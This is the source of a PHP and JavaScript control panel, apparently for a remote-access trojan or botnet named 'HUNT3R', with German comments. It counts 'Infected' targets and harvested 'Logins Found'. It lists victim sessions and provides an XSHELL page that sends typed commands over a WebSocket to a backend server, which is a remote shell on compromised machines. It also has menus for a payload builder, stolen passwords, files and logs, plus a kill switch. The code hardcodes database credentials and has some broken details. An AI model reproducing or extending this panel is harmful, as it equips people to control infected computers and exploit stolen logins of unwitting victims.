<?php
$sid = $_GET['sid'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">   
    <link rel="stylesheet" href="shellstyles.css">   
    <title>HUNT3R | Control Panel</title>
</head>
<body>
    <div class="header">
        <div class="combined-header">
            <div class="horizontal-header">
                <div class="logo">
                    <img src="logo6.png" alt="Logo">
                </div>
                <div class="header-content">
		    <div class="online-count">
            	        <?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Targets:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            	        <?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Infected:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients WHERE status = "Online"');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Clients Online:</font></p>';
        		    echo '<div class="count ';
      			    if ($onlineCount == 0) {
       		  	        echo 'red';
      		     	    } elseif ($onlineCount <= 3) {
       		    		echo 'yellow';
       		  	    } else {
         	   		 echo 'green';
        	  	    }
        	 	    echo '">' . $onlineCount . '</div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xclients');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Active Sessions:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
		    <div class="online-count">
            		<?php
			    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');
	            	    $stmt = $pdo->prepare('SELECT COUNT(*) FROM xpwd');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Logins Found:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        	        ?>
    		    </div>
    	            <div class="online-count">
        		<?php
        		    $pdo = new PDO('mysql:host=localhost;dbname=team', 'hunt3r', 'hunt3r');
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member');
        		    $stmt->execute();
        		    $onlineCount = $stmt->fetchColumn();
        		    echo '<p><font color="white">Team Member:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $onlineCount . '</font></div>';
        		?>
    		    </div>
    		    <div class="online-count">
            		<?php
        		    $stmt = $pdo->prepare('SELECT COUNT(*) FROM member WHERE zstatus = "online"');
        		    $stmt->execute();
        		    $totalClients = $stmt->fetchColumn();
        		    echo '<p><font color="white">Member Online:</font></p>';
        		    echo '<div class="count"><font color="white">';
        		    echo $totalClients . '</font></div>';
        		?>
    		    </div>
                </div>
                <div class="settings-button">
                    <button><img src="settings.png" alt="Settings" width="40" height="40"></button>
                </div>
		<div class="settings-button">
                    <button><img src="logout.png" alt="Logout" width="35" height="35"></button>
                </div>
            </div>
            <div class="vertical-header">
                <div class="menu">
    		    <ul>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">CONTROL</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XBUILD</span></div></a></li>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XSHELL</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XFILE</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XPASS</span></div></a></li>
        	    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XLOGS</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XTEAM</span></div></a></li>
       		    <li><a href="#"><div class="menu-item-box"><span class="menu-item-text">XCHAT</span></div></a></li>
    		    </ul>
	        </div>
                <div class="tabs">
    		    <p><font color="#ffffff"><b>SESSION TABS:</b></font></p><br>
    		    <?php
    			$pdo = new PDO('mysql:host=localhost;dbname=session', 'hunt3r', 'hunt3r');
    			$stmt = $pdo->query('SELECT sessionname, sessionstatus, xid FROM xsession');

    			while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        		    $sessionName = $row['sessionname'];
        		    $sessionStatus = $row['sessionstatus'];
        		    $xid = $row['xid'];

        		    if ($sessionStatus == 0) {
        		        $color = '#ff0000'; // Rot
        		    } elseif ($sessionStatus == 1) {
            			$color = '#ffff00'; // Gelb
        		    } elseif ($sessionStatus == 2) {
            			$color = '#00ff00'; // Grün
        		    } else {
            			$color = '#ffffff'; // Standardfarbe
        		    }

        		    echo '<p class="session"><font color="' . $color . '"><b>[-] <a href="xshell.php?sid=' . $xid . '">' . $sessionName . '</a></b></font></p><br>';
    			}
    		    ?>
	        </div>
            <div class="slider-container">
                <form id="profileForm">
	            <div class="timeinterval"><p><b>Time Interval:</b></p></div>
                        <div class="profile-buttons">
                            <button type="button" class="profile-button active" data-profile="Profil 1">Profile 1</button>
                            <button type="button" class="profile-button" data-profile="Profil 2">Profile 2</button>
                            <button type="button" class="profile-button" data-profile="Profil 3">Profile 3</button>
                        </div>
                    </form>
                </div>
                <div class="version">
		    <p>Version 1.0</p><br>
                    <button class="kill-switch">Kill Switch</button>
                </div>
            </div>
        </div>
    </div>
    <div class="main-content">
        <div class="right-pane">
    	    <h2>XSHELL</h2>
    	    <div class="shellbody">
        	<div class="shell" id="shell-output">
            	     <!-- Hier wird die Shell-Ausgabe angezeigt -->
        	</div>
            <div class="input">
            	<input type="text" id="command-input" placeholder="Enter your command">
            	<button id="execute-button">Execute</button>
            </div>
        </div>
	<script>
	// Funktion, um die SID aus dem DOM zu extrahieren
    	function extractSID() {
    	    const url = window.location.href;
    	    const regex = /sid=(\d+)/; // Annahme: Die SID ist eine Zahl
    	    const match = url.match(regex);
     	   return match ? match[1] : null; // Gibt die SID zurück oder null, wenn keine SID gefunden wurde
    	}

    	// AJAX-Request, um den Port zu bekommen
    	function getPort() {
    	    const sid = extractSID();
     	   if (!sid) {
     	       console.error('SID not found.');
     	       return;
     	   }

      	  const xhr = new XMLHttpRequest();
      	  //xhr.open('GET', `http://localhost:4444//xSHELL_CLIENTx/${sid}`);
      	  xhr.open('GET', `http://localhost:4444//xSLIENTx/${sid}`);
     	  xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    const port = parseInt(xhr.responseText);
                    startWebSocket(port);
                } else {
                    console.error('Failed to get port.');
                }
       	     }
        };
        xhr.send();
    }

    // WebSocket-Verbindung starten
    function startWebSocket(port) {
        //const socket = new WebSocket(`ws://127.0.0.1:${port}`);
        const socket = new WebSocket('127.0.0.1:1202');

        // Wenn die Verbindung geöffnet ist
        socket.addEventListener('open', (event) => {
            // Eventuell Authentifizierung hier durchführen

            // Wenn der "Execute"-Button geklickt wird
            document.getElementById('execute-button').addEventListener('click', () => {
                const commandInput = document.getElementById('command-input');
                const command = commandInput.value;

    	           // Sende den Befehl an den C++-Server
    	           socket.send(command);
	
    	           // Lösche das Eingabefeld
     	           commandInput.value = '';
     	       });

     	       // Wenn Daten vom Server empfangen werden
     	       socket.addEventListener('message', (event) => {
      	           const shellOutput = document.getElementById('shell-output');
    	           const outputLine = document.createElement('pre');
    	           outputLine.textContent = event.data;

      	          // Füge die Server-Antwort zur Shell-Ausgabe hinzu
      	          shellOutput.appendChild(outputLine);
     	       });
     	   });
    	</script>		
        </div>
    </div>
<script type="text/javascript" src="script.js"></script>
<script type="text/javascript" src="xscript.js"></script>
<script type="text/javascript" src="/js/client_interval.js"></script>
</body>
</html>